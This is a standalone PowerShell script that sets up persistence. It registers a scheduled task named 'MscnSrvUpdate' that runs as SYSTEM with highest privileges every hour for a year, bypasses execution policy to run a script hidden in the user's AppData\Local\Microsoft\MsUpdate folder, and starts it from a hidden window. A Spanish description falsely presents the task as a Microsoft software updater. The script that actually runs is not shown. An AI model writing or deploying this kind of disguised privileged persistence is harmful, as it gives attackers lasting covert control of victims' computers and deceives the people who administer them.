$currentUsername = (Get-WmiObject -Class Win32_ComputerSystem).UserName
$cleanUsername = $currentUsername.Split("\")[-1]
$USERNAMEPTH = "C:\Users\$cleanUsername"
Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue

$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Executionpolicy Bypass -NoProfile -File $USERNAMEPTH\AppData\Local\Microsoft\MsUpdate\Mscntask.ps1"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit 0
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea esta deshabilitada o detenida, el software de Microsoft no se actualizara" -Settings $settings -Principal $principal | Out-Null

Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Start-Sleep -Seconds 60; Start-ScheduledTask -TaskName 'MscnSrvUpdate' " -WindowStyle Hidden 
